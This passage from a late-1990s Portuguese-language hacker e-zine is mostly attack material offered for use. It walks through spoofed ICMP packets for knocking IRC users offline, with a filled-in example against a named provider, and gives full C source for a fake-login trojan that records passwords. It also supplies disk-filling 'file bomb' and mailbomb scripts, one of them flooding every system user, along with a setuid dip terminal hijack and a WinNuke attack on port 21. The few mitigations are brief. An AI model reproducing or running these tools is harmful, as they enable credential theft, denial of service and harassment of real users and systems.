+Entao, revisando (com outro ex.), quero conectar meu Cliente IRC ao
+servidor de IRC chamado irc.brasnerd.org.
+
+ORIGEM: 200.249.254.25:1600
+DESTINO: irc.brasnerd.org:6667
+
+No IRC, as portas locais geralmente variam de 1000 a 2000, podendo mudar
+com pouca frequencia. Tudo q vc precisa saber para derrubar alguem com
+Click ou SPing eh isto.
+
+b) Spoofando Pacotes
+
+Como eu faria pra me passar por voce? Nada dificil, mas tbem nao pensem q
+qqer wannabe consegue fazer isso realmente nao, o maximo q fazem eh pegar
+umas receitas de bolo jah prontinhas, sair derrubando usuarios mais
+inexperientes por aih, e jah achando q vao posar pra uma foto ao lado do
+Mitnick. Puro devaneio de wannabe!! :PP
+
+Se eu mascarar meu IP:PORTA pra tentar parecer com vc, eu posso enganar o
+servidor e mandar uma mensagem de ICMP, etc, dizendo q a conexao
+finalizou, q houve um erro na transferencia, e coisas do tipo. Mas para
+isso eu preciso saber EXATAMENTE seu IP (facil facil) e tbem a porta local
+q vc estah usando (aih nao eh pra todo mundo, hehe). Ver  materia  escrita
+por Skynet na edicao rwx00 (netstat).
+
+Por ex, se vc estabelece  uma conexao com o www.provedor.com.br:80, e seu
+ip:porta locais sao 200.249.254.25:1600, eu teria q mascarar meu IP:PORTA
+exatamente como 200.249.254.25:1600. Pq diabos? Porra, pq se o servidor
+recebe uma mensagem de erro vinda de 200.249.254.25:5000 ele nao vai associar
+a porta recebida (5000) com a porta do cara q vc quer derrubar, e simplesmente
+nao vai acontecer NADA.
+
+Daih varios programas como Click usarem uma FAIXA na porta local, tipo de
+1000 ateh 4000. Tbem eh possivel usar uma faixa na porta remota (no caso
+do IRC q existem mtas), como de 6660 ateh 9999, mas demora demais, e nem
+sempre funciona com perfeicao, o melhor no caso das portas remotas, eh
+saber EXATAMENTE a porta conectada pelo usuario-vitima. (80 pra WWW,
+6660-6669 pra IRC).
+
+3) Como funciona o Click (SPing) e GinSu
+
+Entenderam o q escrevi acima? Bem, espero q sim. O Click nada mais faz q
+o descrito acima, soh q com uma interface bunitinha pro Ruindows95, e facil
+pra mto wannabe usar e se achar o phoda (hem hem, reles wannabe's).
+
+P.S. SPING = Mesma merda que o Click, soh que pra UNIX's.
+
+Click e GinSu fazem a mesma coisa, jah vem todos bunitinhos pedindo
+basicamente 5 opcoes:
+
+1o - Client or Server Side Attack
+
+Aki estah um pro. Geralmente o Server Side Attack eh mais dificil de
+funcionar, visto q servidores decentes podem por uma rotina anti-spoof, e/
+ou criptografar pacotes de inicio de conexao, servindo pra evitar ataques
+desse nivel. O Cliente Side Attack funciona como eu falei acima, soh q no
+lado do Cliente (oooohhhhh), entao vejamos:
+
+De tal forma, com Client Side Attack, o Click (ou GinSu) vai spoofar pacotes
+tentando parecer ser o SERVIDOR, e vai mandar esses pacotes para o usuario
+leigo, fragil, e despreparado, hehe!! ;)
+
+Infelizmente nao existe PATCH ou correcao contra isso, pq na verdade
+estamos trabalhando com um BUG/Falha de Implementacao do TCP/IP. Entao,
+seguindo adiante, o Click irah te  mandar  pacotes tentando parecer o
+servidor (IP:PORTA), por isso vc precisa saber EXATAMENTE o IP e PORTA do
+servidor q o cara estah conectado (irc.provedor.com.br:6663, por ex.),
+pode-se tbem usar faixas nas portas, mas demora mais, e nem sempre
+funciona. O Bom mesmo seria usar uma Port Scanner antes, pra detectar a
+porta, e soh entao agir.
+
+Seria necessario tbem saber o IP do USUARIO (oooooohhhhh, sem isso
+c nao pode mandar pacotes pra ele) e tbem sua porta LOCAL, mas pra q esse
+ultimo, jah q estamos usando Client Side Attack, e queremos parecer o
+servidor? Simples, se vc manda um pacote dizendo q eh um servidor pra uma
+porta local q nao estah ativa, o micro do cara nao vai entender PN, e vai
+"perguntar" algo como: 'Porra, pra q esse pacote de erro nessa porta se eu
+nem tenho conexao aberta aki?'.
+
+Simples, mas no caso de portas locais, fica mais facil usar um RANGE,
+algo como de 1000 ateh 1800, ou 2000, se quiser mais seguranca no ataque.
+
+2o - IP do Servidor
+
+Aqui vai o IP do Server que o cara tah conectado.
+
+3o - Porta do Servidor
+
+Usa um RANGE de 6660 ateh 6669, se nao der, usa de 7000 ateh 7002,
+afinal, o user pode estar em qqer dessas portas (um comando '/stats l' no
+servidor mostra as portas disponiveis). Porem, se souber a porta do
+idiota, MELHOR.
+
+Uma tatica boa (pra quem tem preguica de usar Port Scanner) pra pegar a
+porta do coitado eh a chamada tatica-lamer, manda ele digitar isso no mIRC
+dele, estando o mesmo ativo no seu pvt:
+
+//say $port
+
+Isso aih vai mandar pra vc (/msg) a porta dele. O cara soh cai se for
+MUITO otario mesmo, hehe. Pode tbem mandar ele digitar:
+
+//msg seu_nick $port
+
+4o - IP do Usuario
+
+Quer luz eh?!? :) Krai, aki c poe o IP do Usuario (digita /whois nick_do_cara
+q se acha isso ).
+
+5o - Porta do Usuario
+
+Novamente ponha um RANGE, geralmente use 1000 a 2000, se nao der, pode
+tentar uma faixa (range) maior.
+
+Obs. Ha tbem um campo q pede o tipo de ERRO, geralmente deve-se usar
+PROTOCOL UNREACHABLE, por ser mais eficaz com IRC Servers.
+
+4) DrSpewfy - Spoof Mesmo ?!?!
+
+Nahhhhhhhhhhhhhh, isso aki eh um FAKE USER simples porra, c vc tah usando
+DrSpewfy e tah se achando o bala, pode esquecer, vc eh um LAMER isso sim.
+Essa porcaria soh faz criar um FAKE USER, tanto q soh dah pra ver mesmo
+via /whois, e nem CTCP volta, nem MSG chega lah, dah 'No such Nick/Channel'.
+Ackkk:PPPP
+
+Vcs leram a materia da RWX01 sobre Spoof neh? Jizz, coisa e tal, isso
+isso, vc se lembrou, parabens, se nao, leia de novo!! :P Akilo sim eh
+Spoof baseado em BIND DNS, e vale a pena pelo menos pra se divertir (e nao
+ser banido do IRC, hehe). Agora porra, esquecam essa bosta desse DrSpewfy.
+
+5) Erros de Conexoes/Funcionamento Tecnico do Click/GinSu
+
+Kracas, jah escrevi demais pra uma coisa tao simples desta. Mas acho q tah
+dando pra entender.
+
+Vamos simular agora o que aconteceria, se eu, cabra safado, quero derrubar
+o fragil-lamer no IP 200.249.238.67, usando a porta 6669, do servidor de
+IRC irc.telebahia.net.br (hehe, TeleBahia SUX).
+
+1o - Use Client Side Attack
+2o - IP do Servidor: irc.telebahia.net.br
+3o - Porta do Servidor: 6669
+4o - IP do Usuario: 200.249.238.67
+5o - Porta do Usuario: 1000-2000
+6o - Error Type: PROTOCOL UNREACHABLE
+
+Hehehe, agora estamos no jogo galera. O Click/SPing/GinSu vai entrar em
+acao, comecando a mandar pacotes para 200.249.238.67, de porta local em
+porta local (de 1000 a 2000), e sempre dizendo ser
+irc.telebahia.net.br:9999 --> Como teu Cliente IRC (mIRC, Pirch, etc)
+estah conectando exatamente nesse irc.telebahia.net.br:9999, eh soh
+esperar a porra do Click achar a porta local correta (1000-2000) pra
+detonar o usuario. Pq kct o usuario caih?
+
+Quando ele receber os pacotes de erro exatamente na porta local q estah
+conectado, a string recebida seria mais ou menos assim:
+
+'Tua conexao fechou idiota, deu erro de protocol unreachable', o TCP/IP
+Cliente vai enviar um aviso pro mIRC, mandando fechar a conexao com o
+servidor, jah q ele acredita (cegamente!) q o servidor jah fechou a
+conexao com esse errinho aih. O resultado vai ser o usuario ser
+'Disconnected' do servidor de IRC, e aparecer algo assim pros outros
+usuarios do servidor:
+
+Lamer has Quit IRC (Connection reset by peer).
+
+'Connection reset by peer' = Conexao finalizada pelo servidor
+
+Hehe, aki tah a prova, q o idiota do TCP/IP Cliente achou realmente q o
+servidor fechou a conexao, qdo na verdade eram pacotes spoofados q tavam
+chegando ateh ele.
+
+6) Se Protegendo/Prevenindo Dessas Merdas Acima
+
+Bem, nao tem nenhum PATCH realmente nao, o q pode-se fazer eh arrumar um
+BOM Firewall, q bloqueie nao soh pacotes TCP/UDP (pra outros furos) como
+tbem pacotes ICMP. Evidentemente c nao vai bloquear tudo q eh ICMP,
+ainda mais se seu provedor adorar um ICMP Redirect(Provedores de lamerz!).
+
+Entao, instalando um Firewall e bloqueando certos tipos de ICMP Packets,
+como PROTOCOL UNREACHABLE jah dah pra prevenir uma porrada de ataques, mas
+tbem vai prevenir seu cliente TCP/IP de dectetar q um erro REAL desse
+tipo, mas como isso eh RARO, vale a pena setar tais filtros.
+
+Tbem existem outras maneiras de o provedor proteger seus usuarios, setando
+alguns Packet Filters nos roteadores, o q protegem tanto NUKE-Remoto (de
+usuarios fora da LAN ou Dial-Up's dos provedores), qto OOB, Spoof-Remoto,
+etc, etc. Isso tbem dah pra prevenir um certo tipo de SYN_FLOOD, e tbem
+impede seus usuarios de detonarem os outros com tudo isso acima citado.
+
+Como jah escrevi pra krai, e tah ficando grande a materia, vou escrever
+outra sobre 'Como proteger um Provedor/Servidor de varios DoS (Denial of
+Services). Ahhh, se der tempo e tivermos espaco (pode ficar pro outro
+numero) eu vou falar tbem sobre um 'pouquinho' de PHREAKING.
+
+7) Consideracoes Finais
+
+Vcs tem mais o q fazer em vez de ficar se achando os fodas usando essas
+bostas aih neh? Usar uma, duas, tres vezes ainda eh toleravel, soh pra ver
+como funciona e APRENDER de verdade o ataque por ele mesmo, agora ficar se
+gabando por saber usar uma merda dessas, paciencia. Leiam, usem, testem,
+aprendam, raciocinem, e a partir daih, criem suas proprias paradas e
+facam algo realmente util , aih se quiser compartilhar conosco da RWX,
+serah sempre bem-vindo.
+
+(Vou trabalhar!! Ackkk) ;)
+
+Zaph0d
+
+----------------------------------------------------------------------------[rwx]-
+
+08.HACKEANDO UNIX SYSTEM - Metodos Classicos Part II by Skynet
+==============================================================
+
+Hi d00dz,
+
+5. /sbin/dip - DEVICES CONTROLS (LINUX)
+=======================================
+
+Sistemas afetados: Linux com /sbin/dip setado com setuid root.
+
+Bom, esse aqui nao e tao antigo assim, Linux com kernels 2.0.0 estao
+vulneraveis. Resolvi colocar esse trecho aqui pq se enquadra mais ou
+menos dentro dos assuntos anteriores, e nao ha requisitos para explora-lo.
+
+Em algumas versoes do Linux existe uma "falha" no programa dip que faz com
+que qualquer usuario ganhe controle sobre os devices da maquina!Esse furo
+nao chega a ser "grave", e simples de consertar, mas pra quem nao sabe, e
+realmente muito chato.Somente o ROOT pode  resolver o problema(se ele souber
+do que se trata)
+
+Ex:
+
+cyberdine:~$ /sbin/dip -t
+DIP: Dialup IP Protocol Driver version 3.3.7n-uri (17 Apr 95)
+Written by Fred N. van Kempen, MicroWalt Corporation.
+
+DIP> port /dev/tty1      --------------->Aqui eu selecionei o device, poderia
+					 ser qualquer um. No caso o terminal
+					 onde o root ta logado. heheheh!
+DIP> echo on
+DIP> term     -------------------------->modo terminal(Envia o comando direto
+					 pro device .)
+[ Entering TERMINAL mode.  Use CTRL-] to get back ]
+<Aqui vc digita qualquer coisa>
+
+Obs: O que vc digitar nao irar echoar na sua tela e sim da pessoa cujo
+     terminal vc especificou, nao adianta desabilitar o mesg,nao importa
+     tambem com qual ID vc esteja na hora nao ha nada que se possa fazer
+     se for  um usuario comum. Isso alem de deixar a maquina do cara super
+     lenta, dependendo do programa que ele esteja rodando na hora vc pode
+     ate ver o que ele digita! :)
+
+Como resolver?
+
+-rws--s--x   1 root     bin         50392 Nov 25  1995 /sbin/dip-3.3.7n*
+---^--^
+
+      Caso seu dip esteja vulneravel ha uma solucao direta: remover o
+      setuid bit. muito simples, nao?
+      Qualquer crianca com 6 anos faria isso..;-p
+
+Voce pode tirar outros proveitos dessa falha, mas nao cabe a mim dize-las
+aqui, quero apenas deixar  claro  um  ponto  que  muitos(acredito)  nao
+conhecem.
+   ..............................
+
+6. Fake Login - Crackeando uma estacao local.
+============================================
+
+Bom, ate agora tudo que foi dito nessa materia foi baseado em falhas na
+seguranca de sistemas Unix. Agora vamos deixar de lado esse lance de
+bugs/exploits, vamos colocar a cabeca pra funcionar.
+Uma das mais antigas tecnicas de se crackear senhas de usuarios de Unix
+que se conhece e o famoso trojan que simula o /bin/login na entrada. O que
+esse programa faz e simplesmente gravar o que e digitado em um arquivo qualquer
+que definimos no cabecalho do programa. Universidades e algumas empresas sao
+os alvos mais comuns nesse tipo de ataque, pois as estacoes ficam em livre uso
+para os usuarios que tenham conta.
+Nessa versao que desenvolvi especialmente pra Linux, vc pode editar de acordo
+com o sistema de forma a tornar o mais parecido possivel com o issue original.
+O negocio funciona mais ou menos assim:
+
+Welcome to Linux 2.0.0.   \
+                            \
+cyberdine login: root        \  Aqui esta o cabecalho. Olhando assim e'
+Password:                    /  IMPOSSIVEL dizer que se trata de um trojan!
+login incorrect		   /
+
+Welcome to Linux 2.0.0.  \
+                          \ Esse e o verdadeiro.
+cyberdine login:          /
+
+Depois de um certo tempo certamente alguem vai "morder" sua isca. Vamos
+supor que vc seja um cara de sorte e o ROOT tenha entrado, ai e so
+conferir.
+
+cyberdine:/tmp$ cat .hack.pw
+login root  password: laskeime
+
+cyberdine:/tmp$
+
+Vale lembrar que vc tem que ter  uma conta no sistema para executar o Trojan
+na maquina(somente isso!).O resto pode deixar que ele faz sozinho..;)hehe..
+Embora nao seja prioridade,ter um conhecimento basico em C tambem e importante
+na hora que for editar o arquivo para rodar na maquina.
+
+Para os admins aqui vai um conselho de amigo:
+NUNCA logue numa maquina local como root, por mais confiavel que seja seu
+sistema, entre com uma conta comum e execute um "su root" quando necessario.
+E a unica maneira de evitar um hacker de roubar a senha do root nesse tipo
+de ataque.
+
+-----------------------------/*CORTE AQUI*/-------------------------------
+
+/*----------------------------------------------------------------------
+ FILE:     loghack.c
+ VERSAO:   1.0
+ SISTEMAS: Qualquer um na plataforma UNIX.
+ FUNCAO  : Captura logins e senhas de usuarios numa maquina local.
+
+ By Skynet  20/08/97
+ ----------------------------------------------------------------------*/
+#define PASSWORD "Password: "
+#define LOGERR "\nLogin incorrect"
+#define FILENAME "/tmp/.hack.pw" /* Aqui vc define o diretorio/arquivo que
+                                    contera  as senhas */
+#include <stdio.h>
+#include <signal.h>
+
+void stop ()
+{
+        return;
+}
+main()
+{
+char    login[10],
+        password[10];
+int
+  pid;
+FILE    *fo;       /* Arquivo de saida*/
+
+signal (SIGINT, stop);
+pid = getppid();  /* atribui seu processo corrente */
+
+for(;;)
+{
+        /*
+         Aqui vai o que aparera na tela, esperando que ele de entrada no
+	 sistema e execute o Trojan.*/
+
+      for (;;)
+        {
+                system("/usr/bin/clear");
+      loop1:
+                printf( "\n\nWelcome to Linux 2.0.0.");
+      loop2:
+                printf("\n\ncyberdine login: ");
+                gets (login);
+          /* Humm... nao digitou nada? :) */
+                if (strcmp (login, "") != 0)
+                  break;
+                  else
+                     goto loop1;
+         }
+        system ("stty -echo > /dev/console"); /* Desabilita o echo para
+                                                 entrar com a password*/
+        printf(PASSWORD);
+        scanf("%s",password);
+        getchar();
+        system ("stty echo > /dev/console");
+        printf (LOGERR);
+        if ( ( fo = fopen(FILENAME,"a") )  != NULL )
+        {
+                fprintf(fo,"\nlogin %s  password: %s\n",login,password);
+                fclose(fo);  /* crack! */
+        }
+  /* levando  em conta a possibilidade da pessoa errar ao digitar.
+     Logins com menos de 3 caracteres sao provavelmente falsos, entao
+     vamos permanecer no laco*/
+       if (strlen (login) >= 3)
+                break;
+        else
+        goto loop2;
+         }
+       printf (LOGERR);
+      kill (pid,9); /*Mata o processo forcando o bin login original*/
+}
+
+-----------------------------/*CORTE AQUI*/-------------------------------
+
+7 - MISCHIEFS - File B0mbz
+==========================
+
+  Bom, aqui a coisa ja comeca a ficar pesada. Ja falamos de seguranca em
+  tty que podemos desconectar usuarios e cair em shells como num passe de
+  magica. Agora  vamos puxar mais pra area 'cracking'. Mas qual a diferenca?
+  Esses babacas(posso chamar assim), nao tem nada na cabeca e so tem um
+  pensamento: Acabar com a maquina alheia. Sentem prazer com isso...
+
+  Vamos  supor  que  o  cara tenha crackeado a senha  de  alguem  num
+  determinado sistema, e ele seja um 'lamer' que nao saiba unix direito.
+  Como nao tem CAPACIDADE de pegar um root, e com isso nao pode destruir o
+  tudo com um 'rm -f /*'  o que ele faria?
+  DETONARIA o HD da maquina! A coisa mais facil do mundo e fazer isso, o
+  pior e' que nao tem como evitar ja que por default o unix nao vem com a
+  devida protecao, qualquer usuario que tenha acesso a a uma das contas pode
+  fazer isso, mesmo q nao tenha shell!!Portanto aconselho a vc, admin, que
+  limite quota de disco disponivel pra cada usuario, afim de evitar que qq
+  pessoa comprometa todo o funcionamento do sistema.
+
+  7.1- File b0mb #1-Redirecionamento simples
+  ==========================================
+  Essa e 'fraquinha' e  um pouco lenta tambem, mas causa um certo
+  prejuizo. O nohup faz com que o arquivo fique rodando em loop mesmo que
+  vc tenha desconectado, vai ficar rodando ate que nao haja mais espaco no
+  HD e como qualquer sistema necessida de um minimo de espaco de memoria
+  pra funcionar perfeitamente, essa vai passar a apresentar uma serie de
+  problemas!
+
+ Observe:
+
+ cyberdine:/tmp$ cat >bomb.sh
+ echo  Ha! Ha! Ha! HA! HA! Ha! hA! Ha! Ha! HA! Ha! hA! hA! HA!>>-fuck-ya!
+ echo  Ha! Ha! Ha! HA! HA! Ha! hA! Ha! Ha! HA! Ha! hA! hA! HA!>>-fuck-ya!
+ echo  Ha! Ha! Ha! HA! HA! Ha! hA! Ha! Ha! HA! Ha! hA! hA! HA!>>-fuck-ya!
+ nohup bomb.sh &
+ ^C
+ cyberdine:/tmp$ nohup bomb.sh &
+
+...agora pode desconectar e volte algumas horas mais tarde, heheh...
+
+  O direcionamento  a  um  arquivo   comecando  com "-" faz com que
+  o arquivo NAO seja apagado pelo  metodo   convencional,  pois ele
+  interpreta o "-f"como sendo um comando. No  nosso caso  abaixo se
+  tentarmos apagar o arquivo "-fuck-ya" o sistema interpretaria como
+  "rm -f uck-ya" tornando o arquivo inexistente.
+  A solucao para apagar o arquivo seria   vc anular o caracter "-" usando
+  o artificio "rm -- -fuck-ya".
+
+  7.2- File b0mb #2-Redirecionamento multiplo
+  ===========================================
+  Aqui o Admin vai ter o mesmo prejuizo que anteriormente, porem ele
+  tera MUITO mais trabalho em resolver o problema.
+
+  cyberdine:/tmp$ cat >bomb2.sh
+
+  cat -fuck-ya! >> -fuck-ya2!
+  cat -fuck-ya2! >> -fuck-ya!
+  nohup bomb2.sh &
+  ^C
+
+  Esquema:
+  -fuck-ya!  ..  -fuck-ya2  ..  -fuck-ya!  ..  -fuc-ya2 ..
+  100k    >>      200k    >>     300k   >>      500k  >>>> (CRACK!!)
+  700k    >>      1200k   >>     1900k  >>      3100k >>>> (HEHEH!!)
+
+  Haveria uma serie de trocas aumentando progressivamente o tamanho dos
+  arquivos, ate que nao haja mais espaco. Agora imaginem se fizermos isso
+  com arquivos randomicos? hahaha.. nem imagine o prejuizo que vc causaria
+  na maquina do cara! Pura sacanagem...
+
+ 7.3 - Mail B0MB#1 - Individual.
+ ===============================
+ Essa eh boa, a caixa postal de qualquer usuario na maquina pode ser
+ detonada em poucas horas.E o pior, ele nao vai mais poder operar, pois
+ a mensagem vai ficar aparendo insistentemente na tela dele,impedindo-o
+ de digitar algo, hehehe...
+ Uma solucao parcial para o problema seria o usuario setar o biff pra "n".
+ Deste modo ele nao seria notificado quando as mensagem chegassem,
+ entretanto isso nao vai impedir o cara de estourar seu maibox.
+ Criando o a mensagem:
+
+cyberdine:~$ cat > mesg.txt
+
+  - soRRY, buT we cRaCkERz boMbEd yoUr Stupid MAIL bOx...  b00M!
+    Ha! HA! HA! Ha! hA! Ha! Ha! HA! Ha! hA! HA! hA! HA! b00M!
+     		  b00M!         b00M!
+ 	b00M!
+
+[CTRL-C]
+
+Criando o script:
+-----------------
+cyberdine:~$ echo "mail victim < mesg.txt" >mbomb1.sh
+cyberdine:~$ echo nohup mbomb1.sh >>mbomb1.sh
+
+Executando:
+----------
+cyberdine:~$ nohup mbomb1.sh
+
+7.4 - Mail B0MB#2 - Multipla (System Crash!)
+============================================
+Aqui a sacanajem ja e' extrema, com esse script de aparencia insignificante
+faz com que durante sua execucao o sistema entre em  PANE GERAL! e nada
+vai funcionar. Testei aqui na minha maquina e tive que desliga-la! :-)
+
+pra executar:
+
+cyberdine:~/t$ nohup mailbomb2.sh&
+
+------------------------ CORTE AQUI-------------------------------
+#!/bin/sh
+# ARQUIVO:mailbomb2.sh
+# FUNCAO: Detona com a Caixa postal de TODOS os usuarios no sistema.
+# COMO EVITAR: Limitar a quantidade de mensagens enviadas por usuario.
+#
+# By skynet 1997
+
+for user in `awe -F: {print $1} /etc/passwd`
+do
+  mail -s "Muhaahahahha!!!" $user < mesg.txt
+  nohup mailbomb2.sh&
+done
+------------------------CORTE AQUI--------------------------------
+
+Bom, aqui termino minha "pequena" meteria  de hoje com os agredecimentos
+aos meus amigos do Underground pela forca que tenho recebido em todas as
+redes.  Quero deixar claro que qualquer critica,por mais chata que seja,
+sempre e valida.
+
+Cya,
+Skynet 1997
+
+EOF
+
+----------------------------------------------------------------------------[rwx]-
+
+09. OOB to ftp by DmS
+=====================
+
+Bom, pode parecer meio estranho o que eu estou escrevendo por aqui mas andei
+lendo por ai e descobri uma coisa interessante.
+
+Sistemas afetados: Win95, Win 3.1 (provavelmente Win NT)
+
+Bom e' de acreditar que todos conhecem o OOB ou famoso "tela azul" que trava
+o windows. Veja uma maquina rodando um windows com a porta do ftp aberta
+(porta 21) e mande um OOB para ela. Como fazer isso?? Pegue um winnuke
+qualquer e em vez de mandar pra 139 mande pra 21. No win95 isso ira resetar
+o ftp da pessoa, no win3.1 ira' travar o sistema e no Win NT acho que
+acontece o mesmo que acontece com o win95.
+
+Solucao: Para o Win NT, a MS fez um patch. Para os demais nao encontrei
+solucao.
+
+Falowz,
+
+     DmS
+
+--------------x------------------x-----------------x------------
+
+10. SPERL XPLOIT by DmS
+=======================
+Bom to enviando separado do zine, pra voces o exploit do sperl 5.003.
+Ele funciona em maquinas com sperl 5.003 que estejam com "suid" ativo.
+Testado em Slackware 3.1 e 3.2 e tambem num Red Hat 4.1. Funcionou nos tres.
+
+** SOLUCAO: chmod -s sperl5.003 **
+
+Falowz,
+
+----------------------------------------------------------------------------[rwx]-
+
+11. MAILS
+=========
+From : pckopata@?????.??????
+
+    Poxa, não parem não!
+
+   É o melhor e-zine brasileiro! :)
+
+   Sou estudante de Ciência da Computação e estou começando a explorar
+(procurando exploits)em Windows NT e gostaria que vocês falassem mais
+sobre o mesmo
+ Obrigado,
+
+  Continuem!
+
+Até +
+
+[ Bem , nos esperamos continuar...NT nao conseguimos nada importante pra
+falar nessa edicao , mas fique de olhos , provavelmente na proxima vamos
+falar de NT e outros OSes]
+
+E tivemos muitos outros de emails de agradecimento que nos so respondemos
+MUITO OBRIGADO e continuem mandandos
+[]'s
+
+----------------------------------------------------------------------------[rwx]-
+
+        Muito obrigado pro ler a RWX. Se voce tem sugestos a fazer , criticas ,
+ou ate contribuicoes, mande -nos , para que possamos continuar nosso zine .
+Muito Obrigado
+RwX
+
+----------------------------------------------------------------------------[end]-
